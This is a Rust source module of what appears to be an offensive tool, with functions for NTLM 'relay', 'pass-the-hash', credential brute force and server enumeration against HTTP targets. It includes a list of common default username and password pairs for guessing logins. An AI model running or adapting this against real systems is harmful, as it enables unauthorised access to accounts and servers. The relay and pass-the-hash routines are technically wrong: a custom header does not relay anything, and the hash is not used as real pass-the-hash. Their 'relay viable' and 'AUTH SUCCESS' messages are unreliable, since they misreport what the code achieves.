use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTLM Relay Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let headers = resp.headers().clone();
    let status = resp.status().as_u16();

    let www_auth = headers
        .get("www-authenticate")
        .map(|v| v.to_str().unwrap_or(""))
        .unwrap_or("");
    if www_auth.contains("NTLM") {
        println!("  {} NTLM authentication detected", "[+]".green().bold());
    }
    if www_auth.contains("Negotiate") {
        println!("  {} SPNEGO/Negotiate detected", "[+]".green().bold());
    }

    let relay_targets = [
        ("SMB relay", "\\\\\\\\target\\\\C$"),
        ("LDAP relay", "ldap://target:389"),
        ("HTTP relay", "http://target:80"),
        ("MSSQL relay", "sql://target:1433"),
    ];

    for (name, target) in &relay_targets {
        let ntlm_msg = "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==".to_string();
        match client
            .get(url)
            .header("Authorization", format!("NTLM {}", ntlm_msg))
            .header("X-Relay-Target", *target)
            .send()
            .await
        {
            Ok(r) => {
                let s = r.status().as_u16();
                let auth = r
                    .headers()
                    .get("www-authenticate")
                    .map(|v| v.to_str().unwrap_or(""))
                    .unwrap_or("");
                if s == 401 && auth.contains("NTLM") {
                    println!(
                        "  {} {:15} — NTLM challenge received (relay viable)",
                        "[!]".red().bold(),
                        name
                    );
                } else {
                    println!("  {} {:15} — status={}", "[-]".dimmed(), name, s);
                }
            }
            Err(_) => println!("  {} {:15} — error", "[-]".dimmed(), name),
        }
    }

    println!("\n  {} Status: {}", "[*]".cyan().bold(), status);
    Ok(())
}

pub async fn pass(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTLM Pass-the-Hash", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let hashes = [
        ("Empty hash", "00000000000000000000000000000000"),
        ("LM hash", "AAD3B435B51404EEAAD3B435B51404EE"),
        ("NTLM hash admin", "31d6cfe0d16ae931b73c59d7e0c089c0"),
        ("NTLM hash test", "8846f7eaee8fb117ad06bdd830b7586c"),
        ("NTLM hash guest", "aad3b435b51404eeaad3b435b51404ee"),
    ];

    for (name, hash) in &hashes {
        let auth_header = format!(
            "NTLM {}:{}",
            "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==", hash
        );
        match client
            .get(url)
            .header("Authorization", &auth_header)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20} — AUTH SUCCESS", "[!]".red().bold(), name);
                } else if status == 401 {
                    println!("  {} {:20} — rejected", "[-]".dimmed(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTLM Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "P@ssw0rd"),
        ("administrator", "Password1"),
        ("administrator", "Welcome1"),
        ("user", "user"),
        ("user", "password"),
        ("user", "123456"),
        ("guest", "guest"),
        ("guest", ""),
        ("svc", "SVCpass123"),
        ("sql", "Sqlpass123"),
        ("backup", "Backup123"),
    ];

    for (user, pass) in &creds {
        if let Ok(r) = client.get(url).basic_auth(user, Some(pass)).send().await {
            let status = r.status().as_u16();
            if status == 200 {
                println!(
                    "  {} {:20}:{:20} — AUTH SUCCESS",
                    "[+]".green().bold(),
                    user,
                    if pass.is_empty() { "(empty)" } else { pass }
                );
            }
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTLM Info Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let ntlm_type1 = "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==";
    match client
        .get(url)
        .header("Authorization", &format!("NTLM {}", ntlm_type1))
        .send()
        .await
    {
        Ok(r) => {
            let status = r.status().as_u16();
            let headers = r.headers().clone();
            let auth = headers
                .get("www-authenticate")
                .map(|v| v.to_str().unwrap_or("").to_string())
                .unwrap_or_default();
            println!("  Status: {}", status);
            if auth.contains("NTLM") {
                println!("  {} NTLM challenge returned", "[+]".green().bold());
                if let Some(start) = auth.find("TlRMTVNTUAAC") {
                    let challenge = &auth[start..];
                    println!(
                        "  Challenge token: {}...",
                        &challenge[..challenge.len().min(48)]
                    );
                    println!(
                        "  {} Server supports NTLM authentication",
                        "[+]".green().bold()
                    );
                }
            }
            let server = headers
                .get("server")
                .map(|v| v.to_str().unwrap_or(""))
                .unwrap_or("");
            if !server.is_empty() {
                println!("  Server: {}", server);
            }
        }
        Err(_) => println!("  {} NTLM negotiation — error", "[-]".dimmed()),
    }

    let info_endpoints = [
        "/api/info",
        "/api/version",
        "/.well-known/security.txt",
        "/robots.txt",
    ];
    for ep in &info_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} {:25} — {} bytes",
                    "[+]".green().bold(),
                    ep,
                    text.len()
                );
            }
        }
    }

    Ok(())
}
